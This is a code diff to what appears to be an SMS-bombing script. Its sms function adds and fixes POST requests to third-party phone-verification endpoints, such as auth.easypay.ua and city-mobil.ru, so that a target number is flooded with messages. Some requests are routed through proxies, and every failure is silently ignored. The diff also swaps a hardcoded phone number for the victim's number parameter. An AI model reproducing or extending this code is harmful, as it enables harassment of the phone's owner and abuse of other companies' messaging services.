@@ -85,6 +85,14 @@ def sms(prx, number, tm):
 					pass
 
 				try:
+					payload = {
+						"phone": number
+					}
+					requests.post("https://auth.easypay.ua/api/check", json = payload, proxies = proxies)
+				except:
+					pass
+
+				try:
 				    payload = {
 				        "CountryCodeNumber": "+" + number[1:], 
 				        "IsoCountryCode": "RU", 
@@ -97,7 +105,7 @@ def sms(prx, number, tm):
 				try:
 				    payload = {
 				        "landing": "loyalty",
-				        "phone": "79110385633"
+				        "phone": number
 				    }
 				    requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload, proxies = proxies)
 				except:
@@ -281,6 +289,14 @@ def sms(prx, number, tm):
 					pass
 
 				try:
+					payload = {
+						"phone": number
+					}
+					requests.post("https://auth.easypay.ua/api/check", json = payload)
+				except:
+					pass
+
+				try:
 					payload = {"phone": number}
 					requests.post("https://api.iconjob.co/api/auth/verification_code", headers=header, json=payload)
 				except:
@@ -335,7 +351,7 @@ def sms(prx, number, tm):
 				try:
 				    payload = {
 				        "landing": "loyalty",
-				        "phone": "79110385633"
+				        "phone": number
 				    }
 				    requests.post("https://hemingoway.city-mobil.ru/api/v1/send_link", json=payload)
 				except:
